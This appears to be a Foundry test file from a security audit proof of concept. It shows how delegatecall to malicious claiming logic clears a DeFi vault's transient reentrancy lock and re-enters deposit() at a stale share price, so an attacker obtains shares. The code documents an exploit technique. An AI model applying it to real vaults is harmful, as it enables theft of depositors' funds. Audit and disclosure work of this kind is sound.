// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import "forge-std/Test.sol";
import "../src/SiloVaultPoC.sol";

contract SiloVaultPoCTest is Test {
    SimplifiedSiloVault vault;
    MaliciousClaimingLogic malicious;

    address curator = makeAddr("curator");
    address victim = makeAddr("victim");
    address attacker;

    function setUp() public {
        vm.startPrank(curator);
        vault = new SimplifiedSiloVault();
        vm.stopPrank();

        attacker = address(uint160(uint256(keccak256("attacker"))));

        malicious = new MaliciousClaimingLogic(attacker);
    }

    /// @dev Prove that delegatecall-based reentrancy bypasses transient lock
    function test_TransientLockBypass_Reentrancy() public {
        // Step 1: Victim seeds the vault with 100 ETH worth of assets
        vm.prank(victim);
        vault.seed(100 ether);

        assertEq(vault.totalAssets(), 100 ether);
        assertEq(vault.totalShares(), 100 ether);
        assertEq(vault.lastTotalAssets(), 100 ether);

        // Step 2: Curator adds malicious claiming logic
        // (In real vault, this could be via trusted factory which bypasses timelock)
        vm.prank(curator);
        vault.addClaimingLogic(address(malicious));

        // Step 3: Any user calls deposit(), triggering the exploit
        // The malicious logic will:
        //   a) Clear transient _lock via tstore(0, 0)
        //   b) Re-enter deposit() before lastTotalAssets is updated
        //   c) Get shares calculated against stale lastTotalAssets

        uint256 depositAmount = 10 ether;
        vm.prank(victim);
        vault.deposit(depositAmount, victim);

        // Step 4: Check if reentrancy occurred
        uint256 attackerShares = vault.shares(attacker);
        console.log("=== RESULTS ===");
        console.log("Attacker shares:", attackerShares);
        console.log("Victim shares:", vault.shares(victim));
        console.log("Total shares:", vault.totalShares());
        console.log("Total assets:", vault.totalAssets());
        console.log("lastTotalAssets:", vault.lastTotalAssets());

        if (attackerShares > 0) {
            uint256 attackerValue = vault.convertToAssets(attackerShares);
            console.log("Attacker asset value:", attackerValue);
            console.log("");
            console.log("FINDING A CONFIRMED: delegatecall cleared transient lock,");
            console.log("reentrancy deposit succeeded with stale share price.");

            // The attacker got shares at the OLD price (before victim's deposit updated lastTotalAssets)
            assertTrue(attackerShares > 0, "Attacker received shares via reentrancy");
        } else {
            console.log("Reentrancy did not result in attacker shares");
        }
    }

    /// @dev Verify normal operation without malicious logic
    function test_normalOperation() public {
        vm.prank(victim);
        vault.seed(100 ether);

        vm.prank(victim);
        vault.deposit(10 ether, victim);

        assertEq(vault.shares(victim), 110 ether);
        assertEq(vault.totalAssets(), 110 ether);
    }
}
